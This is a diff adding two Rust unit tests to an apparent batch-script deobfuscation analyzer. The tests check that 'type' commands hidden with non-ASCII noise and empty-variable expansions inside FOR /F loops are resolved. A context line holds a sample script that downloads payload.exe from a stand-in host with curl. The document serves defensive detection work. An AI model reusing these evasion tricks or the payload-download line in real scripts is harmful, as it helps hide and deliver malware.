@@ -5497,6 +5497,46 @@ for /F "tokens=1,2 delims==" %%A in (%CFG%) do echo key=%%A value=%%B
     }
 
     #[test]
+    fn for_f_noisy_non_ascii_type_command_reads_tracked_file() {
+        let script = "echo alpha>tmp\r\nfor /F \"tokens=*\" %%A in ('t%(\u{25d5}\u{203f}\u{25d5})%%(\u{2299}\u{03c9}\u{2299})%pe tmp') do echo got=%%A\r\n";
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo got=alpha"),
+            "noisy type command did not read tracked file:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline.contains("tmp")
+            )),
+            "noisy supported type command should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_noisy_type_command_missing_middle_letters_reads_tracked_file() {
+        let script = "echo alpha>tmp\r\nfor /F \"tokens=*\" %%A in ('t%(\u{25d5}\u{203f}\u{25d5})(\u{2299}\u{03c9}\u{2299})%e tmp') do echo got=%%A\r\n";
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo got=alpha"),
+            "noisy type command did not read tracked file:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline.contains("tmp")
+            )),
+            "noisy supported type command should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn compact_for_f_reads_generated_file_source() {
         let script = br#"echo https://compact-for-f.example/payload.exe>url.txt
 for/f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#;
